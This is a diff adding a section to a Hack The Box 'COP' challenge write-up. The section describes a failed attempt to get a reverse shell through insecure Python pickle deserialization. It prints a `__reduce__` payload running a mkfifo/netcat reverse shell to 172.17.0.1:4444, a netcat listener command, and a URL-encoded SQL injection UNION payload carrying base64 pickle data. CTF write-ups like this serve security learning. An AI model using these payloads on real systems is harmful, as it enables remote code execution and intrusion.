@@ -90,3 +90,24 @@ evil_item = {
 Unfortunately for me, it's not.
 
 ![localhost_1337_view_%27%20UNION%20SELECT%20%27gASVPAAAAAAAAAB9lCiMBG5hbWWUjAl7eyA3KjcgfX2UjAtkZXNjcmlwdGlvbpRoAowFcHJpY2WUaAKMBWltYWdllGgCdS4%3D](https://github.com/patzj/HTB-Challenges-Web-COP/assets/10325457/592b423b-3ffb-4527-bb7b-61531f661947)
+
+## Exploitation 2 - Reverse Shell via Insecure Deserialization *(Failed)*
+A while back, I learned about a vulnerability called *Insecure Deserialization*. This vulnerability varies across programming languages, but the core concept is that during deserialization, specific built-in methods are invoked to create the final output. These methods can be manipulated by attackers to execute arbitrary code.
+
+Since the application seems to be heavily reliant on `pickle`, let's start our investigation there. A quick search for "python pickle vulnerability" led me to this informative blog post: https://davidhamann.de/2020/04/05/exploiting-python-pickle/. This article discusses exploiting the `__reduce__` method to establish a reverse TCP connection.
+
+To the best of my understanding, this vulnerability works by creating a named pipe. A TCP connection writes data to the pipe, and `/bin/sh` reads and executes the received data. This effectively allows remote code execution on the vulnerable system.
+
+```py
+class RCE:
+    def __reduce__(self):
+        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
+               '/bin/sh -i 2>&1 | nc 172.17.0.1 4444 > /tmp/f')
+        return os.system, (cmd,)
+
+print(base64.b64encode(pickle.dumps(RCE())).decode())
+```
+
+After ensuring that the test container can run each individual command and connect back to my controlled server, I proceeded to put it to the test. I started a netcat server using the command `nc -lnvp 4444`. This would allow the application to connect to my server and accept commands.
+
+Unfortunately, despite confirming that each individual command worked within the container, the application failed to connect to the server. I tried various reverse shell payloads from the following resource: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md. While the Python payloads functioned within my test environment, they were ineffective in exploiting the actual application.
